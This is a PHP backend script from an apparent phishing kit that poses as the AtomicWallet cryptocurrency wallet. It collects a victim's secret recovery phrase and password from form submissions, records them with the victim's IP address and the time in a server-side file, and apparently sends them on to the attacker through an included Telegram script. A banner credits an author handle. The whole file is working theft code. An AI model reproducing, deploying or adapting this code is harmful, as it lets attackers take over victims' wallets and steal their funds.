<?php
if (isset($_POST['pkey'])) {


$InfoDATE   = date("d-m-Y h:i:sa");


$pkey = $_SESSION['pkey'] = $_POST['pkey'];



$Domin = ''.$_SERVER['HTTP_HOST'].''.$_SERVER['SCRIPT_NAME'].'';
$rt = substr($Domin, 0, -28);
$rtt = ''.$rt.'/Account/dashboard.php' ;
$ban = ''.$rt.'../../Customer.txt' ;
$vuto = ''.$rt.'/Account/dashboard.php' ;


$yagmai .= '
[==========❄️ AtomicWallet ❄️===========]
[🔐 SecurePhrase]=  '.$_SESSION['pkey'].'
[+]━━━━【🕵🏼𝘂𝘀𝗲𝗿-𝗶𝗻𝗳𝗼】━━━[+]
[🌐 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[=====🥷 Main Author: @BLACKROSE_1337=====]

';

include("Your_Info.php"); 
include("TelegramAPi.php");


$f = fopen("../../ad.php", "a");
	fwrite($f, $yagmai);

      header("location:../Waiting.html");    echo "<script>
      setTimeout(function(){
  window.location.href = '../Waiting.html';
      });
   </script>";


}elseif (isset($_POST['password'])) {



    $InfoDATE   = date("d-m-Y h:i:sa");

    
    
    $password = $_SESSION['password'] = $_POST['password'];
    
    
    
    $Domin = ''.$_SERVER['HTTP_HOST'].''.$_SERVER['SCRIPT_NAME'].'';
    $rt = substr($Domin, 0, -28);
    $rtt = ''.$rt.'/Account/dashboard.php' ;
    $ban = ''.$rt.'../../Customer.txt' ;
    $vuto = ''.$rt.'/Account/dashboard.php' ;
    
    
    $yagmai .= '
[👤 Password] =  '.$_SESSION['password'].'
[+]━━━━【💻 System】━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
    ';

    $f = fopen("../../ad.php", "a");
	fwrite($f, $yagmai);

    
    
          header("location:../Access.php");    echo "<script>
          setTimeout(function(){
      window.location.href = '../Access.php';
          });
       </script>";


       include("Your_Info.php"); 
       include("TelegramAPi.php");

       
}
else {




}



?>